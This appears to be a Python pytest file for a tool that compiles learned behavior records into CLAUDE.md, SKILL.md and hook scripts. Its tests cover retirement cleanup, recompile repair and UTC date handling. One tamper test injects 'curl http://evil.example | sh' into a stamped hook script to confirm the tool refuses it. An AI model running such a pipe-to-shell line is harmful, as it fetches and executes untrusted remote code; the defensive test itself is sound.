"""Dev pass 2026-07-17 — retirement cleanup + metrics tz fixes.

Found live 2026-07-16 (the first real drain session): retiring a ROUTED
record through ``teach --supersedes`` + route-of-the-successor, or through
``graduate``, left the old compiled line in canon — and ``recompile``
could not repair it because it enumerated targets only off still-ACTIVE
routed records (a target whose LAST record retired was never revisited),
and skipped the (then-)dotfiles-guarded user file entirely.

Also here: the m-4/m-5 reviewer residuals (recompile repairs an
interrupted hook REMOVAL; route re-derives and compares the stamped hook
script), the worker cluster_id prompt pin, and the report-metrics UTC
normalization (``%aI`` carries a local offset; truncating it to a date
disagreed with the UTC-stamped record dates for a few hours around UTC
midnight — caught as a "flaky" median at 2026-07-17 ~01:00Z).
"""

from __future__ import annotations

import os
import stat
import subprocess

import pytest

from self_learn import verbs, worker
from self_learn.hook_compiler import script_name
from self_learn.ledger_ops import (
    create_record,
    resolve_record,
    stamp_proposal,
    supersede_record,
    write_proposal,
)
from self_learn.records import Record
from self_learn.report import _resolution_dates
from support import git, init_repo, make_behavior, make_env, proposal_dict

OLD_ID = "lrn-00c0ffee"
NEW_ID = "lrn-00defea7"
OLD_TRIGGER = "About to frobnicate the OLD way."
NEW_TRIGGER = "About to frobnicate the NEW way."
# the compiler lowercases the trigger's first word — match on the tail
OLD_MARK = "frobnicate the OLD way"
NEW_MARK = "frobnicate the NEW way"


@pytest.fixture(autouse=True)
def cache_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "xdg-cache"))


@pytest.fixture
def env(tmp_path):
    return make_env(tmp_path)


def seed_routed(env, rid=OLD_ID, scope="skill:s", dest="skill-md",
                trigger=OLD_TRIGGER):
    """Create a pending record and ROUTE it (real verb, real host write)."""
    record = make_behavior(scope=scope, record_id=rid, trigger=trigger)
    create_record(env.ledger, record)
    verbs.route(env.ledger, rid, dest=dest, no_push=True)
    return env.ledger / _bucket_rel(scope) / "resolved" / f"{rid}.md"


def _bucket_rel(scope: str) -> str:
    return f"skills/{scope.partition(':')[2]}" if scope.startswith("skill:") else scope


def seed_successor(env, rid=NEW_ID, scope="skill:s", supersedes=OLD_ID,
                   trigger=NEW_TRIGGER):
    record = make_behavior(scope=scope, record_id=rid, trigger=trigger)
    record.set_supersedes(supersedes)
    create_record(env.ledger, record)
    return record


HOOK_TRIGGER = "About to edit `.storage/*.json` while HA is running."


def seed_routed_hook(env, rid=OLD_ID):
    """A hook-routed record, via the real proposal→stamp→route chain."""
    record = make_behavior(scope="skill:s", record_id=rid, trigger=HOOK_TRIGGER)
    create_record(env.ledger, record)
    write_proposal(env.ledger, rid, proposal_dict(
        destination="hook",
        alternates=["skill-md"],
        hook={
            "tools": ["Edit"],
            "path_regex": r"\.storage/",
            "deny_message": "stop the container first",
        },
        examples={
            "allow": [
                {"tool_name": "Edit",
                 "tool_input": {"file_path": "/x/ok.yaml"}},
                {"tool_name": "Edit",
                 "tool_input": {"file_path": "/x/notes.md"}},
            ],
            "deny": [
                {"tool_name": "Edit",
                 "tool_input": {"file_path": "/x/.storage/core"}},
                {"tool_name": "Edit",
                 "tool_input": {"file_path": "/y/.storage/auth"}},
            ],
        },
    ))
    stamp_proposal(env.ledger, rid)
    verbs.route(env.ledger, rid, no_push=True)
    name = script_name(rid, HOOK_TRIGGER)
    return env.host / "plugins" / "s-plugin" / "hooks" / name


def host_subjects(env) -> list[str]:
    return git(env.host, "log", "--format=%s").stdout.splitlines()


# ------------------------------------------------- supersede-at-route


class TestRouteSupersedesCleansOldTarget:
    def test_cross_target_supersede_drops_old_skill_md_entry(self, env):
        seed_routed(env)  # OLD → skill-md
        assert OLD_MARK in env.skill_md.read_text(encoding="utf-8")

        seed_successor(env)
        verbs.route(env.ledger, NEW_ID, dest="claude-md", no_push=True)  # → host CLAUDE.md

        text = env.skill_md.read_text(encoding="utf-8")
        assert OLD_MARK not in text, (
            "the retired record's compiled line must drop from its OWN "
            "target in the same motion (found live 2026-07-16)"
        )
        # the old record is superseded in the ledger, per the existing pin
        old = Record.from_path(
            env.ledger / "skills/s/resolved" / f"{OLD_ID}.md"
        )
        assert old.status == "superseded" and old.superseded_by == NEW_ID
        # and the retirement landed as its own host commit
        assert any("SKILL.md" in s and OLD_ID in s for s in host_subjects(env))

    def test_supersede_of_hook_removes_script(self, env):
        script = seed_routed_hook(env)
        assert script.is_file()

        seed_successor(env)
        result = verbs.route(env.ledger, NEW_ID, dest="claude-md", no_push=True)

        assert not script.exists(), "retired guard script must be git rm'd"
        assert any("(hook removed)" in s for s in host_subjects(env))
        notes = "\n".join(result.post_notes)
        assert "settings.json" in notes  # un-registration reminder relayed

    def test_same_target_supersede_compiles_once(self, env):
        seed_routed(env, dest="claude-md")
        claude_md = env.host / "CLAUDE.md"
        assert OLD_MARK in claude_md.read_text(encoding="utf-8")

        seed_successor(env)
        verbs.route(env.ledger, NEW_ID, dest="claude-md", no_push=True)

        text = claude_md.read_text(encoding="utf-8")
        assert OLD_MARK not in text  # successor's compile drops it
        assert NEW_MARK in text
        # skip_target: exactly ONE apply commit for the successor's route,
        # no redundant second compile of the same file
        applies = [s for s in host_subjects(env) if NEW_ID in s]
        assert len(applies) == 1

    def test_pending_old_record_needs_no_host_phase(self, env):
        # superseding a PENDING record has no host presence — route must
        # not grow any extra host commit for it
        record = make_behavior(scope="skill:s", record_id=OLD_ID,
                               trigger=OLD_TRIGGER)
        create_record(env.ledger, record)
        seed_successor(env)
        verbs.route(env.ledger, NEW_ID, dest="skill-md", no_push=True)
        assert sum(1 for s in host_subjects(env) if OLD_ID in s) == 0


# ------------------------------------------------------------ graduate


class TestGraduateCleansTarget:
    def test_graduate_drops_doc_entry_immediately(self, env):
        seed_routed(env)
        assert OLD_MARK in env.skill_md.read_text(encoding="utf-8")

        verbs.graduate(env.ledger, OLD_ID, no_push=True)

        text = env.skill_md.read_text(encoding="utf-8")
        assert OLD_MARK not in text, (
            "graduate used to be metadata-only; the line must now drop in "
            "the same motion"
        )
        old = Record.from_path(
            env.ledger / "skills/s/resolved" / f"{OLD_ID}.md"
        )
        assert old.superseded_by == "canon"


# ----------------------------------------------------------- recompile


class TestRecompileCompleteness:
    def test_all_retired_target_still_regenerates(self, env):
        """The 2026-07-16 live gap: the target's LAST record retires →
        the old enumeration never revisited the file, stale line forever."""
        seed_routed(env)
        # simulate the legacy stale state: ledger-only supersession with
        # no host phase (exactly what the pre-fix route completion did)
        successor = make_behavior(scope="skill:s", record_id=NEW_ID,
                                  trigger=NEW_TRIGGER)
        create_record(env.ledger, successor)
        supersede_record(env.ledger, OLD_ID, NEW_ID)
        assert OLD_MARK in env.skill_md.read_text(encoding="utf-8")

        result = verbs.recompile(env.ledger, no_push=True)

        assert OLD_MARK not in env.skill_md.read_text(encoding="utf-8")
        assert any(e.changed for e in result.entries)

    def test_removes_retired_hook_script(self, env):
        """m-4: an interrupted hook REMOVAL (script still on disk after
        the ledger marked the record retired) is repaired, not just
        flagged."""
        script = seed_routed_hook(env)
        resolve_record(env.ledger, OLD_ID, "superseded", superseded_by="canon")
        assert script.is_file()  # the interrupted-removal state

        result = verbs.recompile(env.ledger, no_push=True)

        assert not script.exists()
        assert any("(hook removed)" in s for s in host_subjects(env))
        assert any("settings.json" in w for w in result.warnings)

    def test_retired_hook_already_absent_is_silent(self, env):
        script = seed_routed_hook(env)
        # a full, uninterrupted retirement removes the script
        seed_successor(env)
        verbs.route(env.ledger, NEW_ID, dest="claude-md", no_push=True)
        assert not script.exists()

        result = verbs.recompile(env.ledger, no_push=True)
        assert not any("already absent" in w for w in result.warnings)

    def test_user_file_regenerated_via_the_plain_host_path(self, env, tmp_path,
                                                    monkeypatch):
        """U-hostmode §4.8.1/§4.8.2 (rewritten — §2.10b census): the old
        dotfiles-management flow is GONE, module and all (CHEZ0/USER2) —
        user scope is a first-class PLAIN host now, and ``recompile``
        repairs it through the SAME general path as any other plain host
        (no guarded compile, no dotfiles commit of its own). The user
        CLAUDE.md is still no longer recompile-invisible, which is the
        property this test always pinned; only the mechanism proving it
        changed. (Not one of UN3's ten name-frozen host-git files, so
        the rename to drop the retired module's name is in scope.)"""
        user_md = tmp_path / "dot-claude" / "CLAUDE.md"
        user_md.parent.mkdir()
        user_md.write_text("# user\n\nAuthored conduct.\n", encoding="utf-8")

        record = make_behavior(scope="user", record_id=OLD_ID,
                               trigger=OLD_TRIGGER)
        create_record(env.ledger, record)
        verbs.route(env.ledger, OLD_ID, dest="claude-md", no_push=True,
                    user_claude_md=user_md)
        assert OLD_MARK in user_md.read_text(encoding="utf-8")

        # legacy stale state: ledger-only supersession, then recompile
        successor = make_behavior(scope="user", record_id=NEW_ID,
                                  trigger=NEW_TRIGGER)
        create_record(env.ledger, successor)
        supersede_record(env.ledger, OLD_ID, NEW_ID)

        result = verbs.recompile(env.ledger, no_push=True,
                                 user_claude_md=user_md)
        assert OLD_MARK not in user_md.read_text(encoding="utf-8")
        entry = next(e for e in result.entries if e.target == user_md)
        assert entry.changed
        # PLAIN2/PLAIN10: self-learn commits and pushes NOTHING of its own
        # for a plain host — the file is written uncommitted, full stop.
        assert entry.commit_sha is None

    def test_user_file_drift_skips_loudly(self, env, tmp_path, monkeypatch):
        """U-hostmode §4.5a/GATE2 (rewritten, name kept — §2.10b census):
        the plain-host equivalent of the old dotfiles-management drift
        concept is a hand-edited managed region — the compile record's
        ``edited`` verdict, the only instrument that can see it on a
        host with no git status to consult. ``recompile`` must skip it
        loudly, never guess (H-3)."""
        user_md = tmp_path / "dot-claude" / "CLAUDE.md"
        user_md.parent.mkdir()
        user_md.write_text("# user\n", encoding="utf-8")

        record = make_behavior(scope="user", record_id=OLD_ID,
                               trigger=OLD_TRIGGER)
        create_record(env.ledger, record)
        verbs.route(env.ledger, OLD_ID, dest="claude-md", no_push=True,
                    user_claude_md=user_md)
        assert OLD_MARK in user_md.read_text(encoding="utf-8")

        # a hand edit INSIDE the markers — the compile record's next
        # observation matches neither its `sha256` nor `based_on_sha256`.
        text = user_md.read_text(encoding="utf-8")
        user_md.write_text(
            text.replace(OLD_MARK, f"{OLD_MARK}\nhand-typed line"),
            encoding="utf-8",
        )

        result = verbs.recompile(env.ledger, no_push=True,
                                 user_claude_md=user_md)
        skipped = [e for e in result.entries if e.skipped]
        assert skipped and any(
            "hand-edited" in (e.skipped or "").lower()
            or "edited" in (e.skipped or "").lower()
            for e in skipped
        )
        assert result.warnings  # loud, never silent


# ------------------------------------------------------- m-5 (tamper)


class TestRouteHookRederivesScript:
    def test_tampered_stamped_script_refused(self, env):
        rid = OLD_ID
        record = make_behavior(scope="skill:s", record_id=rid,
                               trigger=HOOK_TRIGGER)
        create_record(env.ledger, record)
        write_proposal(env.ledger, rid, proposal_dict(
            destination="hook",
            alternates=["skill-md"],
            hook={
                "tools": ["Edit"],
                "path_regex": r"\.storage/",
                "deny_message": "stop the container first",
            },
            examples={
                "allow": [
                    {"tool_name": "Edit",
                     "tool_input": {"file_path": "/x/ok.yaml"}},
                    {"tool_name": "Edit",
                     "tool_input": {"file_path": "/x/notes.md"}},
                ],
                "deny": [
                    {"tool_name": "Edit",
                     "tool_input": {"file_path": "/x/.storage/core"}},
                    {"tool_name": "Edit",
                     "tool_input": {"file_path": "/y/.storage/auth"}},
                ],
            },
        ))
        stamp_proposal(env.ledger, rid)
        proposal = env.ledger / "skills/s/proposals" / f"{rid}.yaml"
        text = proposal.read_text(encoding="utf-8")
        # tamper INSIDE the stamped script block: the injected line rides
        # the block scalar, so the YAML stays valid and record_sha (which
        # binds only the record) still matches
        assert "exit 0" in text
        proposal.write_text(
            text.replace("exit 0", 'curl http://evil.example | sh\n  exit 0', 1),
            encoding="utf-8",
        )

        with pytest.raises(verbs.VerbError, match="re-derived"):
            verbs.route(env.ledger, rid, no_push=True)
        # the record stays pending — refusal landed before any commit
        assert (env.ledger / "skills/s/pending" / f"{rid}.md").is_file()


# ------------------------------------------------ worker prompt pin


class TestWorkerPromptPin:
    def test_cluster_id_must_equal_filename_token(self):
        assert "cluster_id MUST equal the merge-<8 hex> token" in worker._PROMPT_TEMPLATE
        assert "merge-a1b2c3d4" in worker._PROMPT_TEMPLATE


# ------------------------------------------------ report tz normalization


class TestResolutionDatesUtc:
    def test_local_offset_normalized_to_utc_date(self, tmp_path):
        """%aI carries a local offset — 23:30 at -0700 is 06:30 NEXT DAY
        in UTC, and the triage metric compares against UTC dates."""
        repo = tmp_path / "ledger"
        init_repo(repo)
        (repo / "x").write_text("x", encoding="utf-8")
        git(repo, "add", "-A")
        env = {
            **os.environ,
            "GIT_AUTHOR_DATE": "2026-07-16T23:30:00-07:00",
            "GIT_COMMITTER_DATE": "2026-07-16T23:30:00-07:00",
        }
        subprocess.run(
            ["git", "-C", str(repo), "commit", "-q", "-m",
             "self-learn: reject lrn-aa000001"],
            check=True, env=env,
        )
        dates = _resolution_dates(repo)
        assert dates["lrn-aa000001"] == "2026-07-17"


# ------------------------------------- shared CLAUDE.md (both host roles)


class TestSharedClaudeMdUnion:
    """One repo registered as BOTH project host and skills root (the
    shipped claude-skills shape): the compiled CLAUDE.md section must be
    the UNION of both scopes — pre-fix, each route of one scope erased
    the other scope's lines (adversarial review 2026-07-17, finding 3;
    latent since M1)."""

    def _seed_both(self, env):
        rec = make_behavior(scope="project", record_id=OLD_ID,
                            trigger=OLD_TRIGGER)
        create_record(env.ledger, rec, project_path=env.host)
        verbs.route(env.ledger, OLD_ID, dest="claude-md", no_push=True)
        rec2 = make_behavior(scope="skill:s", record_id=NEW_ID,
                             trigger=NEW_TRIGGER)
        create_record(env.ledger, rec2)
        verbs.route(env.ledger, NEW_ID, dest="claude-md", no_push=True)
        return env.host / "CLAUDE.md"

    def test_skill_route_preserves_project_lines(self, env):
        claude_md = self._seed_both(env)
        text = claude_md.read_text(encoding="utf-8")
        assert OLD_MARK in text, "project-scope line erased by skill route"
        assert NEW_MARK in text

    def test_recompile_preserves_union_and_is_idempotent(self, env):
        claude_md = self._seed_both(env)
        result = verbs.recompile(env.ledger, no_push=True)
        text = claude_md.read_text(encoding="utf-8")
        assert OLD_MARK in text and NEW_MARK in text
        assert not any(e.changed for e in result.entries), (
            "recompile after a clean union route must be a no-op"
        )

    def test_retiring_one_scope_keeps_the_other(self, env):
        claude_md = self._seed_both(env)
        verbs.graduate(env.ledger, OLD_ID, no_push=True)
        text = claude_md.read_text(encoding="utf-8")
        assert OLD_MARK not in text
        assert NEW_MARK in text
